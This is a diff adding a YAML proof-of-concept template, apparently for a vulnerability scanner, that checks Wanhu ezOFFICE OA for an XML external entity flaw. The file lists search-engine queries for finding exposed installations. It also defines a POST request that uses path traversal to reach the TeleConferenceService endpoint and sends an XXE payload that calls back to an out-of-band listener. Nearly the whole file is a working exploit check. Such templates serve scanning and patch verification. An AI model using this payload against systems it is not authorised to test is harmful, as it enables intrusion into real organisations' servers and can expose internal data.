@@ -1,0 +1,38 @@
+detail:
+  author: 
+  links:
+    - x
+  vulnerability:
+    level: critical
+    fofa-query: app="万户网络-ezOFFICE"
+    hunter-query: app.name="万户 Ezoffice OA"
+    quake-query: app:"万户ezOFFICE协同管理平台"
+    zoomeye-query: title:"万户ezOFFICE协同管理平台"
+    threatbook-query: 
+    cve: 
+    cnvd: 
+    tips: 
+    
+name: poc-yaml-wanhu-ezoffice-TeleConferenceService-xxe
+manual: true
+transport: http
+set:
+    s1: randomInt(1000000000, 9000000000)
+    s2: randomLowercase(8)
+    reverse: newReverse()
+    reverseURL: reverse.url
+rules:
+    r0:
+        request:
+            cache: true
+            method: POST
+            path: /defaultroot/iWebOfficeSign/OfficeServer.jsp/../../TeleConferenceService
+            headers:
+            body: |
+              <?xml version="1.0" encoding="UTF-8" ?>
+              <!DOCTYPE ANY [
+              <!ENTITY xxe SYSTEM "{{reverseURL}}" >]>        
+              <value>&xxe;</value>
+        expression: reverse.wait(5)
+
+expression: r0()
